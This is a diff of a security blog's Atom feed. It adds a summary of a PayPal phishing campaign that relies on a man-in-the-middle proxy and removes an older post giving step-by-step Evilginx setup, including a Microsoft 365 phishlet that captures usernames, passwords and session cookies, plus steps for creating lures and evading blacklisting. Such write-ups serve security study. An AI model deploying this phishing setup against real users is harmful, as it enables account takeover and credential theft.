@@ -1,4 +1,37 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-12T19:49:50+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">PD @0xd4ngi</title><subtitle>Security Researcher</subtitle><author><name>Prashant Dangi</name></author><entry><title type="html">Buffer Overflows and The Virtual memory layout</title><link href="http://localhost:4000/binary-exploitation/virtual-memory-layout/" rel="alternate" type="text/html" title="Buffer Overflows and The Virtual memory layout" /><published>2025-01-09T00:00:00+05:30</published><updated>2025-01-09T00:00:00+05:30</updated><id>http://localhost:4000/binary-exploitation/virtual-memory-layout</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/virtual-memory-layout/"><![CDATA[<h1 id="what-is-virtual-memory-layout">What is Virtual Memory Layout</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-18T12:01:56+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">PD @0xd4ngi</title><subtitle>Security Researcher</subtitle><author><name>Prashant Dangi</name></author><entry><title type="html">PayPal Phishing with PayPal URL</title><link href="http://localhost:4000/phishing/paypal-phishing/" rel="alternate" type="text/html" title="PayPal Phishing with PayPal URL" /><published>2025-01-18T00:00:00+05:30</published><updated>2025-01-18T00:00:00+05:30</updated><id>http://localhost:4000/phishing/paypal-phishing</id><content type="html" xml:base="http://localhost:4000/phishing/paypal-phishing/"><![CDATA[<h1 id="paypal-phishing-with-paypal-url">PayPal Phishing with Paypal URL</h1>
+
+<p>Fortinet CISO received a mail requesting an invoice amount to be paid, with paypal domain <strong>paypal.com</strong></p>
+
+<p><img src="/assets/images/paypal-phishing.jpeg" alt="" /></p>
+
+<p>This attack involves legitimate paypal URL. According to the CISO, this attack is so clever and sophisticated that gets past PayPal’s
+phishing detection policy.</p>
+
+<h1 id="this-is-not-tagging-of-url-to-text-but-man-in-the-middlemitm-attack">This is not tagging of url to text but Man in the Middle(MITM) Attack</h1>
+
+<p>This attack starts with an authentic email sent from <em>service@paypal.com</em> requsting money for some invoice. Exeperienced internet
+users may be fooled by the email’s appearance and authenticity of email with legitimate PayPal login URL.</p>
+
+<p>The Pay Now button at the bottom is genuine looking redirecting to paypal’s website.</p>
+
+<p>It might be using Man in the Middle(MitM) Proxy phishing. With the help of tools like
+<a href="https://github.com/kgretzky/evilginx2">Evilginx</a></p>
+
+<p>Tools like <a href="https://github.com/kgretzky/evilginx2">Evilginx</a> uses phishlets to get to legitimate websites and phishing domain lures
+to get the credentials and cookies of the user to redirect to legit website and intercepting the traffic in between.</p>
+
+<h1 id="but-how-did-he-got-to-know"><em>BUT</em> how did he got to know</h1>
+
+<p>When he saw that it was sent to <em>Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com</em> and if he might login using his credentials all 
+his credentials and cookies might be gone.</p>
+
+<p><img src="/assets/images/fig04.jpeg" alt="" /></p>
+
+<h2 id="about-the-email">About the email</h2>
+
+<p>The attackers have registered a MS365 test domain, Which is free for three months, and then a distribution list containing the victim emails <em>.onmicrosoft.com</em></p>
+
+<p>Reference for the post: <a href="https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing">Phish-free PayPal Phishing</a></p>]]></content><author><name>Prashant Dangi</name></author><category term="phishing" /><summary type="html"><![CDATA[Attackers using sophisticated attacks to bypass login security]]></summary></entry><entry><title type="html">Buffer Overflows and The Virtual memory layout</title><link href="http://localhost:4000/binary-exploitation/virtual-memory-layout/" rel="alternate" type="text/html" title="Buffer Overflows and The Virtual memory layout" /><published>2025-01-09T00:00:00+05:30</published><updated>2025-01-09T00:00:00+05:30</updated><id>http://localhost:4000/binary-exploitation/virtual-memory-layout</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/virtual-memory-layout/"><![CDATA[<h1 id="what-is-virtual-memory-layout">What is Virtual Memory Layout</h1>
 
 <p>Operating System manages memory for programs using virtual memory, which is referred as the <strong>virtual memory layout</strong>. Programs are given their own virtual address space, isolating them from other programs.</p>
 
@@ -593,108 +626,4 @@ Broken object level authentication(BOLA) is #1 OWASP API Security
   <li>Domain-Specific Flaws : API management tools analystics and reporting capabilities to identify and analyze usage patters</li>
 </ol>
 
-<p><a href="https://github.com/0xd4ngi/Hacking-APIs-Breaking-Web-Application-P-Breaking-Web-Application-Programming-Interfaces/blob/main/Corey%20Ball%20-%20Hacking%20APIs-No%20Starch%20Press%20(2022).pdf">Hacking API’s</a></p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[API Testing]]></summary></entry><entry><title type="html">Phishing Domain 1 Evilginx</title><link href="http://localhost:4000/phishing-domain-1-evilginx/" rel="alternate" type="text/html" title="Phishing Domain 1 Evilginx" /><published>2024-01-14T00:00:00+05:30</published><updated>2024-01-14T00:00:00+05:30</updated><id>http://localhost:4000/phishing-domain-1-evilginx</id><content type="html" xml:base="http://localhost:4000/phishing-domain-1-evilginx/"><![CDATA[<h3 id="setting-up-the-domain1">Setting up the domain1</h3>
-
-<h3 id="setting-up-the-nameservers--route53">Setting up the nameservers ~ Route53</h3>
-
-<h3 id="setting-up-the-vps--ec2">Setting up the VPS ~ EC2</h3>
-<p>Ubuntu free tier <br />
-Generate ssh key pair</p>
-<h4 id="network-settings">Network Settings</h4>
-<p>configuring the ssh to local computer ip</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://ipinfo.io/ip 
-</code></pre></div></div>
-<p>and http/s and DNS from 0.0.0.0 (anywhere) ~~&gt; Launch</p>
-
-<h3 id="setting-up-evilginx-in-instance">setting up <a href="https://github.com/kgretzky/evilginx2">evilginx</a> in instance</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
-<span class="c">#INSATLLING GO</span>
-<span class="nb">cd</span> ~
-curl <span class="nt">-OL</span> https://golang.org/dl/go1.21.6.linux-amd64.tar.gz
-<span class="nb">sha256sum </span>go1.21.6.linux-amd64.tar.gz
-<span class="nb">sudo tar</span> <span class="nt">-C</span> /usr/local <span class="nt">-xvf</span> go1.21.6.linux-amd64.tar.gz
-<span class="nb">sudo </span>nano ~/.profile
-<span class="c">### adding this</span>
-<span class="c">## export PATH=$PATH:/usr/local/go/bin</span>
-<span class="nb">source</span> ~/.profile
-go version
-
-git clone https://github.com/kgretzky/evilginx2.git
-<span class="nb">cd </span>evilginx2
-make
-<span class="nb">sudo</span> ./build/evilginx <span class="nt">-p</span> /phishlets/
-
-<span class="c">## help ~~ ## config domain 1 ~~ ## config ipv4</span>
-<span class="c">### domain pointing to instance public ip</span>
-<span class="c">## setting up the phishlets</span>
-<span class="c">## phishlets hostname m365 domain1</span>
-<span class="c">## phishlets enable m365</span>
-</code></pre></div></div>
-<h3 id="phishlets-in-my-case-is-m365">phishlets in my case is m365</h3>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">min_ver</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3.2.0'</span>
-<span class="na">proxy_hosts</span><span class="pi">:</span>
-  <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">microsoftonline.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span><span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">}</span>
-  <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">logon'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">live.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">false</span><span class="pi">}</span>
-  <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">www'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">www'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">office.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">false</span><span class="pi">}</span>
-<span class="na">sub_filters</span><span class="pi">:</span>
-<span class="na">auth_tokens</span><span class="pi">:</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.live.com'</span> <span class="c1">#domain that sends the cookie</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span> <span class="c1">#name of cookie to steal</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">live.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.login.live.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login.live.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.login.microsoftonline.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login.microsoftonline.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>  
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.microsoft.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span> 
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">microsoft.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.office.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">office.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">.www.office.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-  <span class="pi">-</span> <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">www.office.com'</span>
-    <span class="na">keys</span><span class="pi">:</span> <span class="pi">[</span><span class="s1">'</span><span class="s">.*:regexp'</span><span class="pi">]</span>
-<span class="na">auth_urls</span><span class="pi">:</span>
-  <span class="pi">-</span> <span class="s1">'</span><span class="s">/landingv2'</span>
-<span class="na">credentials</span><span class="pi">:</span>
-  <span class="na">username</span><span class="pi">:</span>
-    <span class="na">key</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span>
-    <span class="na">search</span><span class="pi">:</span> <span class="s1">'</span><span class="s">(.*)'</span>
-    <span class="na">type</span><span class="pi">:</span> <span class="s1">'</span><span class="s">post'</span>
-  <span class="na">password</span><span class="pi">:</span>
-    <span class="na">key</span><span class="pi">:</span> <span class="s1">'</span><span class="s">passwd'</span>
-    <span class="na">search</span><span class="pi">:</span> <span class="s1">'</span><span class="s">(.*)'</span>
-    <span class="na">type</span><span class="pi">:</span> <span class="s1">'</span><span class="s">post'</span>
-<span class="na">login</span><span class="pi">:</span>
-  <span class="na">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login.microsoftonline.com'</span>
-  <span class="na">path</span><span class="pi">:</span> <span class="s1">'</span><span class="s">/'</span> <span class="c1"># path to where the login is, on the domain.    </span>
-</code></pre></div></div>
-
-<h3 id="pointing-subdomains-of-domain-1-to-phishlets-subdomain">pointing subdomains of domain 1 to phishlets subdomain</h3>
-
-<p>login <br />
-logon and <br />
-www ~~&gt; to the domain1 ip that is the instance ip running the server</p>
-
-<h3 id="creating-lures-in-evilginx">creating lures in evilginx</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## in evilginx</span>
-lures create m365
-lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
-</code></pre></div></div>
-<h2 id="adding-another-domain-to-prevent-blacklisting">Adding another domain to prevent BLACKLISTING</h2>
-
-<p>Adding another apache server</p>
-
-<p>Next part in domain 2</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Setting up the domain1]]></summary></entry></feed>
+<p><a href="https://github.com/0xd4ngi/Hacking-APIs-Breaking-Web-Application-P-Breaking-Web-Application-Programming-Interfaces/blob/main/Corey%20Ball%20-%20Hacking%20APIs-No%20Starch%20Press%20(2022).pdf">Hacking API’s</a></p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[API Testing]]></summary></entry></feed>
